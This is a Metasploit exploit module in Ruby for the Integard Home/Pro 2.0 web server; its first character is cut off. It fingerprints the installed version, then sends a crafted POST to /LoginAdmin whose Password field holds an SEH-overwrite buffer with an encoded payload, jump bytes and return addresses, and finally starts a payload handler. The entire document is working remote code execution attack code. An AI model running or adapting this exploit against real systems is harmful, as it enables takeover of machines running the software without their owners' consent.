lass Metasploit3 < Msf::Exploit::Remote
 
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Integard Home/Pro version 2.0',
            'Description'    => %q{
                    Exploit for Integard HTTP Server, vulnerability discovered by Lincoln
            },
            'Author'  =>
                [
                    'Lincoln',
                    'Nullthreat',
                    'rick2600',
                ],
            'License'       => MSF_LICENSE,
            'Version'       => '$Revision: $',
            'References'    =>
                [
                    ['URL','http://www.corelan.be:8800/advisories.php?id=CORELAN-10-061'],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'thread',
                },
            'Payload'        =>
                {
                    'Space'    => 2000,
                    'BadChars'  => "\x00\x20\x26\x2f\x3d\x3f\x5c",
                    'StackAdjustment' => -3500,
                },
            'Platform'       => 'win',
            'Privileged'     => false,
            'Targets'        =>
                [
                    [ 'Automatic Targeting',          { 'auto' => true }],
                    [ 'Integard Home 2.0.0.9021', { 'Ret' => 0x0041565E,}],
                    [ 'Integard Pro  2.2.0.9026', { 'Ret' => 0x0040362C,}],
                ],
            'DefaultTarget'  => 0))
 
        register_options(
            [
                Opt::RPORT(18881)
            ], self.class )
    end
 
    #Current version does not work with bind() type of payloads
    #meterpreter, windows/exec  etc works fine
 
    def exploit
        mytarget = target
        if(target['auto'])
            mytarget = nil
            print_status("[*] Automatically detecting the target...")
            connect
            get = "GET /banner.jpg HTTP/1.1\r\n\r\n"
            sock.put(get)
            data = sock.recv(1024)
                if (data =~ /Content-Length: 24584/)
                    print_status("[!] Found Version - Integard Home")
                    mytarget = self.targets[1]
                end
                if (data =~ /Content-Length: 23196/)
                    print_status("[!] Found Version - Integard Pro")
                    mytarget = self.targets[2]
                end
            sock.close
        end
        connect
        print_status("[!] Selected Target: #{mytarget.name}")
        print_status("[*] Building Buffer")
        pay = payload.encoded
        junk = rand_text_alpha_upper(3091 - pay.length)
        jmp = "\xE9\x2B\xF8\xFF\xFF"
        nseh = "\xEB\xF9\x90\x90"
        seh = [mytarget.ret].pack('V')
        buffer = junk + pay + jmp + nseh + seh
        print_status("[*] Sending Request")
        req = "POST /LoginAdmin HTTP/1.1\r\n"
        req << "Host: 192.168.2.129:18881\r\n"
        req << "Content-Length: 1074\r\n\r\n"
        req << "Password=" + buffer + "&Redirect=%23%23%23REDIRECT%23%23%23&NoJs=0&LoginButtonName=Login"
        sock.put(req)
        print_status("[*] Request Sent")
        sock.close
        handler
    end
end